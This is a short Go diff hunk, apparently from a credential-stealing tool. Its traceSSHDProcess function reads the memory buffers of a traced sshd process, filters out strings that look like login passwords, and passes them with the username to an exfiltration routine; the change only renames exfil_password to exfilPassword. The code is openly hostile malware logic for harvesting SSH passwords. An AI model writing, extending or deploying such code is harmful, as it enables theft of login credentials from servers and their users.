@@ -56,7 +56,7 @@ func traceSSHDProcess(pid int) {
 
 					var password = removeNonPrintableAscii(string(buffer))
 					if len(password) > 2 && len(password) < 100 && exfiled && !strings.HasPrefix(password, "fSHA256") {
-						go exfil_password(username, removeNonPrintableAscii(password))
+						go exfilPassword(username, removeNonPrintableAscii(password))
 					}
 					exfiled = !exfiled
 				}
